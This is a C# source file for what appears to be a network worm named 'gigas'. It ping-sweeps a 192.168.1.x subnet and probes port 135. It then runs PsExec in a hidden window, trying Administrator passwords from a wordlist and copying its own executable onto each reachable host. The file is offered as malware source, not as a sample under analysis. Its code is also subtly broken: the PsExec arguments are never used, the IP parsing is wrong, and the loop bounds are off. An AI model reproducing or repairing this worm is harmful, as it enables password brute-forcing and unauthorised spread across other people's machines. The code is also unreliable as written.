namespace gigas;

using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
public class Worms
{

    public static async void Entrypoint(string pwl)
    {
        await Def(pwl);
    }
    
    private static async Task Def(string pwl)
    {
        IEnumerable<string> lines = File.ReadLines(pwl);
        List<string> addrs = new List<string>();
        string path = Environment.ProcessPath;
        string baseip = "192.168.1.";
        int s = 1;
        int e = 254;

        for (int i = s; i <= e; i++)
        {
            string ip = baseip + i;
            if (await PingHost(ip))
            {
                Console.WriteLine($"{ip} is active.");
                addrs.Add(ip);
                
            }
            
        }

        await Spread(addrs, lines, path);
    }

    private static async Task<bool> Spread(List<string> adrs, IEnumerable<string> pwl, string path)
    {
        using (TcpClient tcl = new TcpClient ())
        {
            for (int i = 0; i <= adrs.Count; i++)
            {
                try
                {
                    byte[] bytes = Encoding.ASCII.GetBytes(adrs[i]);
                    IPAddress nadr = new IPAddress(bytes);
                    IPEndPoint edp = new IPEndPoint(nadr, 135);
                    await tcl.ConnectAsync(edp);
                  
                    
                    
                    foreach (string line in pwl)
                    {
                        string arguments = $@"\\{adrs[i]} -u Administrator -p {line}  -c -csrc ""{path} gigas.exe";
                        ProcessStartInfo psi = new ProcessStartInfo
                        {
                        
                            FileName = "C:\\Windows\\System32\\PsExec.exe",
                            WindowStyle = ProcessWindowStyle.Hidden,
                            CreateNoWindow = true
                        
                        };

                        
                        using (Process proc = Process.Start(psi))
                        {
                        
                            proc.WaitForExit();

                        }

                        
                    }
                    return true;
                   

                }
                catch
                {
                    return false;
                }
                    
            }
            
        }

        return true;
    }

    private static async Task<bool> PingHost(string s)
    {
        using (Ping ping = new Ping())
        {
            try
            {
                PingReply reply = await ping.SendPingAsync(s, 1000);
                return reply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }
    }
}